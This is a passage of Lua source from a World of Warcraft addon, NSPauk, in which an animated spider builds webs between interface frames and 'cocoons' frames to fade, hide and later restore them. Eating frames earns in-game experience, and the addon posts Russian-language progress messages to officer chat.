    inst.webSectors = sectors

    local scheduled = self:NP_CollectScheduledOwners()

    if type(scheduled) ~= "table" then
        scheduled = {}
    end

    local tasks = {}
    local added = 0

    local cursor = self:NP_GetSpiderPointIfShown()
        or {
            x = S.lastSpiderX or 0,
            y = S.lastSpiderY or 0,
        }

    local function isDrawn(owner)
        return self:NP_IsWebOwnerDrawn(owner)
    end

    local function addSegTasks(seg)
        if not seg
            or not seg.alive
            or isDrawn(seg)
            or scheduled[seg] then
            return nil
        end

        local thread = seg.thread

        if not thread or not thread.p0 or not thread.p2 then
            return nil
        end

        local drawThread =
            self:NP_OrientThreadForCursor(thread, cursor)
            or thread

        local travelConn = seg.connA or seg.connB
        local before = #tasks

        self:AddTravelPointTask(
            tasks,
            cursor,
            drawThread.p0,
            travelConn,
            seg
        )

        local task = self:AddThreadTask(tasks, seg, drawThread)

        added = added + (#tasks - before)

        if task then
            scheduled[seg] = true

            return {
                x = drawThread.p2.x,
                y = drawThread.p2.y,
            }
        end

        return nil
    end

    for _, sector in ipairs(sectors) do
        local connA = inst.conns[sector.a]
        local connB = inst.conns[sector.b]

        if connA
            and connB
            and connA.alive
            and connB.alive
            and isDrawn(connA)
            and isDrawn(connB) then

            if connA.thread
                and (not connA.arcLength or connA.arcLength <= 0) then
                local samples, total = self:BuildArcSamples(connA.thread)
                connA.arcSamples = samples
                connA.arcLength = total
            end

            if connB.thread
                and (not connB.arcLength or connB.arcLength <= 0) then
                local samples, total = self:BuildArcSamples(connB.thread)
                connB.arcSamples = samples
                connB.arcLength = total
            end

            local function ensureArc(arcLen)
                if type(arcLen) ~= "number"
                    or arcLen ~= arcLen
                    or arcLen < minCross then
                    return
                end

                local seg = self:NP_FindPairSegAtArc(
                    inst,
                    connA,
                    connB,
                    arcLen,
                    spacing
                )

                if not seg then
                    local targetA = math.min(arcLen, connA.arcLength or 0)
                    local targetB = math.min(arcLen, connB.arcLength or 0)

                    if targetA > 0 and targetB > 0 then
                        local tA = self:ThreadTAtLength(connA, targetA)
                        local tB = self:ThreadTAtLength(connB, targetB)

                        if tA and tB then
                            seg = self:CreateCrossSegArc(
                                inst,
                                connA,
                                connB,
                                tA,
                                tB,
                                minCross
                            )

                            if seg then
                                seg.planSectorKey = sector.key
                                seg.planArcLen = arcLen
                                seg.isRecheck = true
                            end
                        end
                    end
                end

                if seg then
                    local newCursor = addSegTasks(seg)

                    if newCursor then
                        cursor = newCursor
                    end
                end
            end

            local rowArcs = self:NP_GetSectorRowArcs(connA, connB)

            for _, rowArc in ipairs(rowArcs) do
                ensureArc(rowArc)
            end
        end
    end

    if added > 0 then
        for _, task in ipairs(tasks) do
            S.tasks[#S.tasks + 1] = task
        end

        if S.phase == "instanceComplete" then
            S.phase = "task"
            S.completeTimer = 0
            self:AdvanceTask()
        elseif not S.currentTask then
            self:AdvanceTask()
        end
    end

    inst.lastSectorRecheck = {
        at = GetTime(),
        crossCount = inst.builtCrossCount or 0,
        sectors = #sectors,
        added = added,
    }

    S.nspSectorRecheckRunning = false

    return added
end

function NSPauk:NP_PointInTriangle(px, py, ax, ay, bx, by, cx, cy)
    local function sign(x1, y1, x2, y2, x3, y3)
        return (x1 - x3) * (y2 - y3) - (x2 - x3) * (y1 - y3)
    end

    local d1 = sign(px, py, ax, ay, bx, by)
    local d2 = sign(px, py, bx, by, cx, cy)
    local d3 = sign(px, py, cx, cy, ax, ay)

    local hasNeg = (d1 < 0) or (d2 < 0) or (d3 < 0)
    local hasPos = (d1 > 0) or (d2 > 0) or (d3 > 0)

    return not (hasNeg and hasPos)
end

function NSPauk:NP_FindPairSegAtArc(inst, connA, connB, arcLen, spacing)
    if not inst or not connA or not connB then
        return nil
    end

    local best = nil
    local bestDiff = spacing * 0.6

    for _, seg in ipairs(inst.crossSegs or {}) do
        if seg.alive and seg.thread then
            local direct = seg.connA == connA and seg.connB == connB
            local reverse = seg.connA == connB and seg.connB == connA

            if direct or reverse then
                local segArc = nil

                if type(seg.recheckArcLen) == "number"
                    and seg.recheckArcLen == seg.recheckArcLen
                    and seg.recheckArcLen > 0 then
                    segArc = seg.recheckArcLen
                elseif type(seg.planArcLen) == "number"
                    and seg.planArcLen == seg.planArcLen
                    and seg.planArcLen > 0 then
                    segArc = seg.planArcLen
                else
                    local p = nil

                    if seg.connA == connA then
                        p = seg.thread.p0
                    elseif seg.connB == connA then
                        p = seg.thread.p2
                    end

                    if p and connA.thread then
                        local t, d = self:NP_NearestThreadT(
                            connA.thread,
                            p.x,
                            p.y
                        )

                        if type(d) == "number" and d <= 12 then
                            segArc = t * (connA.arcLength or 0)
                        end
                    end
                end

                if type(segArc) == "number"
                    and segArc == segArc
                    and segArc > 0 then
                    local diff = math.abs(segArc - arcLen)

                    if diff < bestDiff then
                        bestDiff = diff
                        best = seg
                    end
                end
            end
        end
    end

    return best
end

function NSPauk:NP_RecheckWebSectorsByTriangles(inst)
    return 0
end

function NSPauk:MakeTopDownDrawThread(thread, cursorPoint)
    if not thread or not thread.p0 or not thread.p2 then
        return nil
    end

    local p0 = thread.p0
    local p2 = thread.p2

    local p1 = thread.p1 or {
        x = (p0.x + p2.x) / 2,
        y = (p0.y + p2.y) / 2,
    }

    local reverse = false
    local yTol = 0.01

    if p0.y < p2.y - yTol then
        reverse = true
    elseif math.abs(p0.y - p2.y) <= yTol and cursorPoint then
        local d0x = p0.x - cursorPoint.x
        local d0y = p0.y - cursorPoint.y
        local d0 = d0x * d0x + d0y * d0y

        local d2x = p2.x - cursorPoint.x
        local d2y = p2.y - cursorPoint.y
        local d2 = d2x * d2x + d2y * d2y

        if d2 < d0 then
            reverse = true
        end
    end

    local drawThread

    if reverse then
        drawThread = {
            p0 = { x = p2.x, y = p2.y },
            p1 = { x = p1.x, y = p1.y },
            p2 = { x = p0.x, y = p0.y },
        }
    else
        drawThread = {
            p0 = { x = p0.x, y = p0.y },
            p1 = { x = p1.x, y = p1.y },
            p2 = { x = p2.x, y = p2.y },
        }
    end

    drawThread.ownerRef = thread.ownerRef

    return drawThread, reverse
end

function NSPauk:AddMainThreadTasks(inst, tasks, cursorPoint)
    if not inst or not inst.conns or #inst.conns == 0 then
        return cursorPoint
    end

    local pending = {}

    for i, conn in ipairs(inst.conns) do
        pending[i] = conn
    end

    while #pending > 0 do
        local bestIndex = nil
        local bestDraw = nil
        local bestScore = math.huge

        for i, conn in ipairs(pending) do
            local drawThread = self:MakeTopDownDrawThread(conn.thread, cursorPoint)

            if drawThread then
                local score

                if cursorPoint then
                    local dx = drawThread.p0.x - cursorPoint.x
                    local dy = drawThread.p0.y - cursorPoint.y

                    score = dx * dx + dy * dy
                else
                    score = -drawThread.p0.y
                end

                if score < bestScore then
                    bestScore = score
                    bestIndex = i
                    bestDraw = drawThread
                end
            end
        end

        if not bestIndex or not bestDraw then
            break
        end

        local conn = pending[bestIndex]

        table.remove(pending, bestIndex)

        if cursorPoint then
            self:AddTravelPointTask(tasks, cursorPoint, bestDraw.p0, conn, conn)
        end

        local task = self:AddThreadTask(tasks, conn, bestDraw)

        task.isMain = true

        cursorPoint = {
            x = bestDraw.p2.x,
            y = bestDraw.p2.y,
        }
    end

    return cursorPoint
end

function NSPauk:NP_ChooseEvenRingCount()
    local C = self.C or {}
    local min = math.floor(tonumber(C.TARGET_COUNT_MIN) or 3)
    local max = math.floor(tonumber(C.TARGET_COUNT_MAX) or 6)
    if min < 4 then
        min = 4
    end
    if max < min then
        max = min
    end
    local minEven = math.ceil(min / 2) * 2
    local maxEven = math.floor(max / 2) * 2
    if minEven < 4 then
        minEven = 4
    end
    if maxEven < minEven then
        maxEven = minEven
    end
    local choices = {}
    for value = minEven, maxEven, 2 do
        choices[#choices + 1] = value
    end
    if #choices == 0 then
        return 4
    end
    return choices[math.random(1, #choices)]
end

function NSPauk:BuildInstanceTasks(inst)
    local S = self.S
    local tasks = {}

    inst.crossRowsList = {}
    inst.interSegs = {}
    inst.webSectors = {}
    inst.crossRows = 0

    local cursorPoint = nil

    if S.spider and S.spider:IsShown() then
        cursorPoint = {
            x = S.lastSpiderX,
            y = S.lastSpiderY,
        }
    end

    if inst.isNaturalRing then
        cursorPoint = self:NP_BuildNaturalRingMainTasks(
            inst,
            tasks,
            cursorPoint
        )

        for _, conn in ipairs(inst.conns or {}) do
            if conn.isSpoke
                and conn.thread
                and (not conn.arcLength or conn.arcLength <= 0) then

                local samples, total = self:BuildArcSamples(conn.thread)
                conn.arcSamples = samples
                conn.arcLength = total
            end
        end

        self:NP_NormalizeRingCrossSegs(inst)

        inst.crossRows = #(inst.crossSegs or {})
        inst.nspRingCrossQueueDirty = true
        inst.tasks = tasks

        return
    end

    cursorPoint = self:AddMainThreadTasks(inst, tasks, cursorPoint)

    local N = #inst.conns

    if N >= 2 then
        for _, conn in ipairs(inst.conns) do
            if conn.thread
                and (not conn.arcLength or conn.arcLength <= 0) then

                local samples, total = self:BuildArcSamples(conn.thread)
                conn.arcSamples = samples
                conn.arcLength = total
            end
        end

        self:NP_BuildTriangleSectorTasks(inst, tasks, cursorPoint)

        inst.crossRows = #(inst.crossSegs or {})
    end

    inst.tasks = tasks
end

function NSPauk:NP_GetTriangleCheckHubIgnore()
    local v = tonumber(self.C.WEB_HUB_IGNORE_DIST) or 100

    if type(v) ~= "number" or v ~= v or v < 16 then
        v = 16
    end

    if v > 40 then
        v = 40
    end

    return v
end

function NSPauk:NP_ThreadsFarEnough(threadA, threadB, ignoreHubDist, minDist)
    if not threadA or not threadB then
        return false
    end

    ignoreHubDist = tonumber(ignoreHubDist) or 200
    minDist = tonumber(minDist) or 100

    if minDist <= 0 then
        return true
    end

    local ptsA = self:SampleThreadPoints(threadA, ignoreHubDist)
    local ptsB = self:SampleThreadPoints(threadB, ignoreHubDist)

    if #ptsA == 0 or #ptsB == 0 then
        return false
    end

    local min2 = minDist * minDist

    for _, a in ipairs(ptsA) do
        for _, b in ipairs(ptsB) do
            local dx = (a.x or 0) - (b.x or 0)
            local dy = (a.y or 0) - (b.y or 0)

            if dx * dx + dy * dy < min2 then
                return false
            end
        end
    end

    return true
end

function NSPauk:NP_TriangleSectorClear(inst, connA, connB)
    if not inst
        or not connA
        or not connB
        or not connA.thread
        or not connB.thread then
        return false
    end

    local hubX = (inst.hub.rect and inst.hub.rect.cx) or 0
    local hubY = (inst.hub.rect and inst.hub.rect.cy) or 0

    local ax, ay = self:BzThread(connA.thread, 1)
    local bx, by = self:BzThread(connB.thread, 1)

    local area = math.abs(
        (ax - hubX) * (by - hubY)
        - (bx - hubX) * (ay - hubY)
    )

    if area < 100 then
        return false
    end

    local ignoreHub = self:NP_GetTriangleCheckHubIgnore()

    for _, connC in ipairs(inst.conns or {}) do
        if connC ~= connA
            and connC ~= connB
            and connC.alive
            and connC.thread
            and not connC.noSector then
            local pts = self:SampleThreadPoints(connC.thread, ignoreHub)

            for _, p in ipairs(pts) do
                if self:NP_PointInTriangle(
                    p.x or 0,
                    p.y or 0,
                    hubX,
                    hubY,
                    ax,
                    ay,
                    bx,
                    by
                ) then
                    return false
                end
            end
        end
    end

    return true
end

function NSPauk:NP_GetValidTriangleSectors(inst)
    local out = {}
    if not inst or not inst.conns then
        return out
    end
    if inst.isNaturalRing then
        return self:NP_GetRingSectors(inst)
    end
    local N = #inst.conns
    if N < 2 then
        return out
    end
    local C = self.C or {}
    local minCross = tonumber(C.MIN_CROSS_LEN) or 4
    if minCross < 0 then
        minCross = 4
    end
    local function ensureLen(conn)
        if conn
            and conn.thread
            and (not conn.arcLength or conn.arcLength <= 0) then
            local samples, total = self:BuildArcSamples(conn.thread)
            conn.arcSamples = samples
            conn.arcLength = total
        end
    end
    for i = 1, N do
        local connA = inst.conns[i]
        if connA
            and connA.alive
            and not connA.noSector then
            for j = i + 1, N do
                local connB = inst.conns[j]
                if connB
                    and connB.alive
                    and not connB.noSector then
                    ensureLen(connA)
                    ensureLen(connB)
                    local pairMin = math.min(
                        connA.arcLength or 0,
                        connB.arcLength or 0
                    )
                    if pairMin >= minCross
                        and self:NP_TriangleSectorClear(inst, connA, connB) then
                        out[#out + 1] = {
                            a = i,
                            b = j,
                            key = i .. "-" .. j,
                            pairMin = pairMin,
                        }
                    end
                end
            end
        end
    end
    table.sort(out, function(x, y)
        if x.a == y.a then
            return x.b < y.b
        end
        return x.a < y.a
    end)
    return out
end

function NSPauk:NP_BuildTriangleSectorTasks(inst, tasks, cursorPoint)
    local C = self.C

    if not inst or not tasks then
        return cursorPoint
    end

    local minCross = tonumber(C.MIN_CROSS_LEN) or 4
    if minCross < 0 then
        minCross = 4
    end

    local sectors = self:NP_GetValidTriangleSectors(inst)
    inst.webSectors = sectors

    local cursor = cursorPoint

    for _, sector in ipairs(sectors) do
        local connA = inst.conns[sector.a]
        local connB = inst.conns[sector.b]

        if connA
            and connB
            and connA.alive
            and connB.alive then

            local function addRow(arcLen)
                if type(arcLen) ~= "number"
                    or arcLen ~= arcLen
                    or arcLen < minCross then
                    return
                end

                local targetA = math.min(arcLen, connA.arcLength or 0)
                local targetB = math.min(arcLen, connB.arcLength or 0)

                if targetA <= 0 or targetB <= 0 then
                    return
                end

                local tA = self:ThreadTAtLength(connA, targetA)
                local tB = self:ThreadTAtLength(connB, targetB)

                if tA and tB then
                    local seg = self:CreateCrossSegArc(
                        inst,
                        connA,
                        connB,
                        tA,
                        tB,
                        minCross
                    )

                    if seg then
                        seg.planSectorKey = sector.key

                        seg.planArcLen = arcLen

                        local drawThread =
                            self:NP_OrientThreadForCursor(seg.thread, cursor)
                            or seg.thread

                        if cursor then
                            self:AddTravelPointTask(
                                tasks,
                                cursor,
                                drawThread.p0,
                                connA,
                                seg
                            )
                        end

                        local task = self:AddThreadTask(tasks, seg, drawThread)

                        if task then
                            cursor = {
                                x = drawThread.p2.x,
                                y = drawThread.p2.y,
                            }
                        end
                    end
                end
            end

            local rowArcs = self:NP_GetSectorRowArcs(connA, connB)

            for _, arcLen in ipairs(rowArcs) do
                addRow(arcLen)
            end
        end
    end

    return cursor
end

function NSPauk:CreateInstance(hub, candidates, targetCount)
    local inst = {
        id = self.nextInstanceId,
        hub = {
            frame = hub.frame,
            name = hub.name,
            rect = self:CopyRect(hub),
        },
        conns = {},
        crossSegs = {},
        interSegs = {},
        crossRowsList = {},
        webSectors = {},
        tasks = {},
        crossRows = 0,
        anchorCandidates = {},
        drawnPoints = 0,
        settled = false,
    }

    self.nextInstanceId = self.nextInstanceId + 1

    local seenAnchors = {}

    local function addAnchor(rect)
        local key = (rect.frame and tostring(rect.frame)) or rect.name

        if not key then
            key = tostring(rect.left) .. ":" .. tostring(rect.top)
        end

        if not seenAnchors[key] then
            seenAnchors[key] = true
            inst.anchorCandidates[#inst.anchorCandidates + 1] = rect
        end
    end

    addAnchor(inst.hub.rect)

    if not candidates or #candidates == 0 then
        return nil
    end

    local C = self.C

    local targetMinDist = tonumber(C.WEB_TARGET_MIN_DISTANCE) or 200
    local threadHubSkip = tonumber(C.WEB_THREAD_HUB_SKIP) or 200
    local threadMinDist = tonumber(C.WEB_THREAD_MIN_DISTANCE) or 100

    local acceptedTargets = {}
    local acceptedThreads = {}

    local function dist2(ax, ay, bx, by)
        local dx = (ax or 0) - (bx or 0)
        local dy = (ay or 0) - (by or 0)
        return dx * dx + dy * dy
    end

    local function targetFarFromHub(item)
        if not item or not hub then
            return false
        end

        local d2 = dist2(item.cx, item.cy, hub.cx, hub.cy)
        return d2 >= targetMinDist * targetMinDist
    end

    local function targetFarFromAccepted(item)
        if not item then
            return false
        end

        for _, other in ipairs(acceptedTargets) do
            local d2 = dist2(item.cx, item.cy, other.cx, other.cy)

            if d2 < targetMinDist * targetMinDist then
                return false
            end
        end

        return true
    end

    local made = 0
    local totalAttempts = 0
    local maxAttempts = tonumber(C.WEB_TARGET_REROLL_ATTEMPTS)
    if type(maxAttempts) ~= "number"
        or maxAttempts ~= maxAttempts
        or maxAttempts < 1 then
        maxAttempts = 8
    end

    local maxTotalAttempts = targetCount * maxAttempts * 4

    while made < targetCount and totalAttempts < maxTotalAttempts do
        totalAttempts = totalAttempts + 1

        local cand = candidates[math.random(1, #candidates)]
        local target = cand and cand.item

        if target
            and target ~= hub
            and target.frame ~= hub.frame then
            if targetFarFromHub(target)
                and targetFarFromAccepted(target) then
                for _ = 1, 3 do
                    local thread = self:MakeRadialThread(
                        inst.hub.rect,
                        target,
                        1,
                        1
                    )

                    if not thread then
                        break
                    end

                    local samples, total = self:BuildArcSamples(thread)

                    if total >= threadHubSkip + 1 then
                        local ok = true

                        for _, otherThread in ipairs(acceptedThreads) do
                            if not self:NP_ThreadsFarEnough(
                                thread,
                                otherThread,
                                threadHubSkip,
                                threadMinDist
                            ) then
                                ok = false
                                break
                            end
                        end

                        if ok then
                            local conn = {
                                id = #inst.conns + 1,
                                target = {
                                    frame = target.frame,
                                    name = target.name,
                                    rect = self:CopyRect(target),
                                },
                                thread = thread,
                                angle = thread.angle,
                                textures = {},
                                alive = true,
                                arcSamples = samples,
                                arcLength = total,
                            }

                            thread.ownerRef = {
                                inst = inst,
                                conn = conn,
                            }

                            inst.conns[#inst.conns + 1] = conn
                            acceptedThreads[#acceptedThreads + 1] = thread
                            acceptedTargets[#acceptedTargets + 1] = target

                            made = made + 1

                            addAnchor(self:CopyRect(target))

                            break
                        end
                    end
                end
            end
        end
    end

    if #inst.conns < 2 then
        return nil
    end

    self:BuildInstanceTasks(inst)

    return inst
end

function NSPauk:NP_OrientThreadForCursor(thread, cursor)
    if not thread or not thread.p0 or not thread.p2 then
        return nil
    end

    local function cp(p)
        if not p then
            return { x = 0, y = 0 }
        end

        return {
            x = p.x or 0,
            y = p.y or 0,
        }
    end

    local p0x = thread.p0.x or 0
    local p0y = thread.p0.y or 0
    local p2x = thread.p2.x or 0
    local p2y = thread.p2.y or 0

    local p1 = thread.p1 or {
        x = (p0x + p2x) / 2,
        y = (p0y + p2y) / 2,
    }

    local normal = {
        p0 = cp(thread.p0),
        p1 = cp(p1),
        p2 = cp(thread.p2),
        ownerRef = thread.ownerRef,
        angle = thread.angle,
    }

    if not cursor then
        return normal
    end

    local cx = cursor.x or 0
    local cy = cursor.y or 0

    local d0x = cx - p0x
    local d0y = cy - p0y
    local d0 = d0x * d0x + d0y * d0y

    local d2x = cx - p2x
    local d2y = cy - p2y
    local d2 = d2x * d2x + d2y * d2y

    if d2 < d0 then
        return {
            p0 = cp(thread.p2),
            p1 = cp(p1),
            p2 = cp(thread.p0),
            ownerRef = thread.ownerRef,
            angle = thread.angle,
        }
    end

    return normal
end

function NSPauk:PickCocoonVictim(items)
    local pool = self:CollectCocoonCandidates(items, false)

    if #pool == 0 then
        return nil
    end

    return pool[self:RandomInt(1, #pool)]
end

function NSPauk:EllipsePoint(cx, cy, a, b, ang)
    return cx + a * math.cos(ang), cy + b * math.sin(ang)
end

function NSPauk:AddCocoonConn(inst, item, thread)
    local conn = {
        id = #inst.conns + 1,
        target = {
            frame = item.frame,
            name = item.name,
            rect = self:CopyRect(item),
        },
        thread = thread,
        angle = math.atan2(thread.p0.y - item.cy, thread.p0.x - item.cx),
        textures = {},
        alive = true,
    }

    thread.ownerRef = {
        inst = inst,
        conn = conn,
    }

    inst.conns[#inst.conns + 1] = conn

    return conn
end

function NSPauk:CreateCocoonInstance(item)
    local C = self.C

    local inst = {
        id = self.nextInstanceId,
        isCocoon = true,
        hub = {
            frame = item.frame,
            name = item.name,
            rect = self:CopyRect(item),
        },
        conns = {},
        crossSegs = {},
        interSegs = {},
        crossRowsList = {},
        tasks = {},
        crossRows = 0,
        anchorCandidates = { self:CopyRect(item) },
        drawnPoints = 0,
        settled = false,
    }

    self.nextInstanceId = self.nextInstanceId + 1

    local cx = item.cx
    local cy = item.cy

    local a0 = item.width / 2
    local b0 = item.height / 2

    local wraps = self:RandomInt(C.COCOON_WRAPS_MIN, C.COCOON_WRAPS_MAX)
    local segs = C.COCOON_LOOP_SEGS

    local prevEnd = nil

    for w = 1, wraps do
        local grow = 0.58 + 0.50 * (w / wraps)

        local a = a0 * grow + (math.random() - 0.5) * 6
        local b = b0 * grow + (math.random() - 0.5) * 6

        if a < 9 then
            a = 9
        end

        if b < 9 then
            b = 9
        end

        local startAng = math.random() * 2 * math.pi
        local dir = (math.random() < 0.5) and 1 or -1

        for s = 1, segs do
            local ang0 = startAng + dir * (s - 1) * (2 * math.pi / segs)
            local ang1 = startAng + dir * s * (2 * math.pi / segs)

            local x0, y0 = self:EllipsePoint(cx, cy, a, b, ang0)
            local x1, y1 = self:EllipsePoint(cx, cy, a, b, ang1)

            x0 = x0 + (math.random() - 0.5) * 5
            y0 = y0 + (math.random() - 0.5) * 5
            x1 = x1 + (math.random() - 0.5) * 5
            y1 = y1 + (math.random() - 0.5) * 5

            local midX = (x0 + x1) / 2
            local midY = (y0 + y1) / 2

            local pushX = midX - cx
            local pushY = midY - cy

            local pl = math.sqrt(pushX * pushX + pushY * pushY)

            if pl < 1 then
                pushX, pushY, pl = 0, 1, 1
            end

            local push = pl * (0.22 + math.random() * 0.22)

            local thread = {
                p0 = { x = x0, y = y0 },
                p1 = {
                    x = midX + (pushX / pl) * push,
                    y = midY + (pushY / pl) * push,
                },
                p2 = { x = x1, y = y1 },
            }

            local conn = self:AddCocoonConn(inst, item, thread)

            if prevEnd then
                self:AddTravelPointTask(inst.tasks, prevEnd, thread.p0, conn, conn)
            end

            self:AddThreadTask(inst.tasks, conn, thread)

            prevEnd = { x = thread.p2.x, y = thread.p2.y }
        end
    end

    local diags = self:RandomInt(C.COCOON_DIAG_MIN, C.COCOON_DIAG_MAX)

    for _ = 1, diags do
        local angA = math.random() * 2 * math.pi
        local angB = angA + math.pi + (math.random() - 0.5) * 1.1

        local x0, y0 = self:EllipsePoint(cx, cy, a0 * 1.06, b0 * 1.06, angA)
        local x1, y1 = self:EllipsePoint(cx, cy, a0 * 1.06, b0 * 1.06, angB)

        local thread = {
            p0 = { x = x0, y = y0 },
            p2 = { x = x1, y = y1 },
        }

        self:MakeSag(thread, "main")

        local conn = self:AddCocoonConn(inst, item, thread)

        if prevEnd then
            self:AddTravelPointTask(inst.tasks, prevEnd, thread.p0, conn, conn)
        end

        self:AddThreadTask(inst.tasks, conn, thread)

        prevEnd = { x = thread.p2.x, y = thread.p2.y }
    end

    if #inst.conns == 0 then
        return nil
    end

    return inst
end

function NSPauk:StartCocoon(victim)
    local S = self.S
    local C = self.C

    local inst = self:CreateCocoonInstance(victim)

    if not inst then
        if S.limitCocoonPending then
            S.limitCocoonPending = false
            S.phase = "limitWait"

            local interval = tonumber(C.LIMIT_COCOON_INTERVAL) or 1800
            local retry = tonumber(C.LIMIT_COCOON_RETRY) or 60

            S.limitWaitTimer = math.max(0, interval - retry)
        else
            S.phase = "watch"
            S.stillTimer = 0
            S.speedTimer = 0
        end

        return
    end

    self:AddInstance(inst)

    S.currentInstance = inst

    -- Помечаем первую задачу кокона как входную.
    -- Это нужно, чтобы анти-телепорт использовал общий маршрут.
    if type(inst.tasks) == "table" and inst.tasks[1] then
        inst.tasks[1].nspCocoonEntry = true
    end

    self:MkSpider()
    self:MkClickBtn()

    -- Сразу добавляем общий маршрутный подход к первой точке кокона.
    self:NP_InsertCocoonEntryApproach(inst)

    S.tasks = inst.tasks
    S.taskIdx = 1
    S.currentTask = nil
    S.completeTimer = 0

    self:AdvanceTask()
end

function NSPauk:BeginDissolve(inst)
    local S = self.S
    local C = self.C

    if not inst then
        if S.limitReached or S.limitCocoonPending then
            S.limitCocoonPending = false
            self:ReturnToLimitHome()
        else
            S.phase = "watch"
            S.stillTimer = 0
            S.speedTimer = 0
        end

        return
    end

    local frame = inst.hub.frame

    local aliveCount = 0
    for _, conn in ipairs(inst.conns) do
        if conn.alive then
            aliveCount = aliveCount + 1
        end
    end

    local isUIParent = frame == UIParent

    if not frame or not frame.SetAlpha or not frame.GetAlpha or aliveCount == 0 then
        self:TearInstance(inst)

        if S.limitReached or S.limitCocoonPending then
            S.limitCocoonPending = false
            self:ReturnToLimitHome()
        else
            S.phase = "watch"
            S.stillTimer = 0
            S.speedTimer = 0
        end

        return
    end

    local baseAlpha = frame:GetAlpha() or 1

    local minAlpha
    if isUIParent then

        minAlpha = baseAlpha
    else
        minAlpha = math.min(C.MIN_COCOON_ALPHA, baseAlpha)
    end

    S.cocoon = {
        inst = inst,
        frame = frame,
        baseAlpha = baseAlpha,
        minAlpha = minAlpha,
        duration = self:RandomFloat(C.DISSOLVE_DURATION_MIN, C.DISSOLVE_DURATION_MAX),
        timer = 0,
        digested = false,
        isUIParent = isUIParent,
    }

    S.phase = "dissolve"
    S.speedTimer = 0
end

function NSPauk:SetInstanceWebAlpha(inst, alpha)
    if not inst then
        return
    end

    if alpha < 0 then
        alpha = 0
    end

    for _, conn in ipairs(inst.conns) do
        for _, texture in ipairs(conn.textures) do
            texture:SetAlpha(alpha)
        end
    end

    for _, seg in ipairs(inst.crossSegs) do
        for _, texture in ipairs(seg.textures) do
            texture:SetAlpha(alpha)
        end
    end
end

function NSPauk:SafeHideFrame(f)
    if not f then
        return
    end

    local canHide = true

    if f.IsProtected and f:IsProtected() then
        canHide = false
    end

    if canHide and f.Hide then
        f:Hide()
    end

    if f.SetAlpha then
        f:SetAlpha(0)
    end
end

function NSPauk:SafeShowFrame(f, alpha)
    if not f then
        return
    end

    if f.Show then
        f:Show()
    end

    if f.SetAlpha then
        f:SetAlpha(alpha or 1)
    end
end

function NSPauk:AddDigestedFrame(frame, baseAlpha)
    if not frame then
        return
    end

    local S = self.S

    if not S.digestedFrames then
        S.digestedFrames = {}
    end

    for _, info in ipairs(S.digestedFrames) do
        if info.frame == frame then
            info.baseAlpha = baseAlpha or info.baseAlpha or 1
            return
        end
    end

    table.insert(S.digestedFrames, {
        frame = frame,
        baseAlpha = baseAlpha or 1,
    })
end

function NSPauk:RestoreDigestedFrames()
    local S = self.S

    if not S.digestedFrames then
        S.digestedFrames = {}
    end

    for i = #S.digestedFrames, 1, -1 do
        local info = S.digestedFrames[i]

        if info and info.frame then
            self:SafeShowFrame(info.frame, info.baseAlpha or 1)
        end

        table.remove(S.digestedFrames, i)
    end
end

function NSPauk:RemoveInstance(inst)
    local S = self.S

    if not inst then
        return
    end

    for i, v in ipairs(S.instances) do
        if v == inst then
            table.remove(S.instances, i)
            break
        end
    end

    if S.currentInstance == inst then
        S.currentInstance = nil
    end
end

function NSPauk:HideInstanceTextures(inst)
    if not inst then
        return
    end

    for _, conn in ipairs(inst.conns) do
        self:RecycleTextures(conn.textures)
        conn.alive = false
    end

    for _, seg in ipairs(inst.crossSegs) do
        self:RecycleTextures(seg.textures)
        seg.alive = false
    end
end

function NSPauk:BreakAnchoredToFrame(frame)
    if not frame then
        return
    end

    local S = self.S

    for _, inst in ipairs(S.instances) do
        if inst.hub.frame == frame then
            self:TearInstance(inst)
        else
            for _, conn in ipairs(inst.conns) do
                if conn.alive and conn.target.frame == frame then
                    self:KillConnection(inst, conn)
                end
            end
        end
    end
end

function NSPauk:FinishCocoonDigestion()
    local S = self.S
    local c = S.cocoon

    if not c then
        if S.limitReached or S.limitCocoonPending then
            self:ReturnToLimitHome()
        else
            S.phase = "watch"
            S.stillTimer = 0
            S.speedTimer = 0
        end

        return
    end

    local victimName

    if c.inst
        and c.inst.hub
        and type(c.inst.hub.name) == "string"
        and c.inst.hub.name ~= "" then
        victimName = c.inst.hub.name
    elseif c.frame and c.frame.GetName then
        victimName = c.frame:GetName()
    end

    local isUIParent = c.isUIParent
        or c.frame == UIParent
        or victimName == "UIParent"

    if c.inst then
        self:SettleInstance(c.inst)
    end

    local victimDesc = self:DescribeVictim(c.frame, victimName)

    if isUIParent then

        if UIParent and UIParent.GetAlpha then
            S.uiParentBaseAlpha = UIParent:GetAlpha() or 1
        end

        self:HideSpider()

        if UIParent and UIParent.SetAlpha then
            UIParent:SetAlpha(0)
        end

        self:AwardImmediateLevel(victimDesc)
    else
        self:AwardCocoonExperience(victimDesc)
    end

    if c.frame and not isUIParent then
        self:SafeHideFrame(c.frame)
        self:AddDigestedFrame(c.frame, c.baseAlpha or 1)
    end

    if c.inst then
        self:HideInstanceTextures(c.inst)
        self:RemoveInstance(c.inst)
    end

    if not isUIParent then
        self:BreakAnchoredToFrame(c.frame)
    end

    S.cocoon = nil

    S.tasks = {}
    S.taskIdx = 1
    S.currentTask = nil
    S.completeTimer = 0

    if isUIParent then

        self:StartUIParentRestore(10)
        return
    end

    if S.limitReached or S.limitCocoonPending then
        self:ReturnToLimitHome()
    else
        self:StartNewInstance(nil)
    end
end

function NSPauk:AwardImmediateLevel(targetName)
    local C = self.C
    local db = self:EnsureDB()

    local perLevel = tonumber(C.POINTS_PER_LEVEL) or 60000
    if type(perLevel) ~= "number" or perLevel ~= perLevel or perLevel <= 0 then
        perLevel = 60000
    end

    local total = db.progress.totalPoints or 0
    local need = perLevel - (total % perLevel)

    if type(need) ~= "number"
        or need ~= need
        or need <= 0
        or need > perLevel then
        need = perLevel
    end

    local amount, level, left, levelsGained = self:AddExperience(need)

    if type(level) ~= "number" or level ~= level then
        level = math.floor((db.progress.totalPoints or 0) / perLevel)
    end

    if type(left) ~= "number" or left ~= left then
        left = perLevel - ((db.progress.totalPoints or 0) % perLevel)

        if left == perLevel then
            left = 0
        end
    end

    if type(levelsGained) ~= "number"
        or levelsGained ~= levelsGained
        or levelsGained < 1 then
        levelsGained = 1
    end

    self:SendOfficer(string.format(
        "Мой павук хардкорно съел %s! Немедленно получено %d опыта, уровней: %d. Уровень %d, до уровня %d",
        tostring(targetName or "UIParent"),
        amount or need,
        levelsGained,
        level,
        left
    ))
end

function NSPauk:DescribeVictim(frame, name)
    if frame == UIParent or name == "UIParent" then
        return "весь интерфейс целиком (UIParent)"
    end

    local n = ""

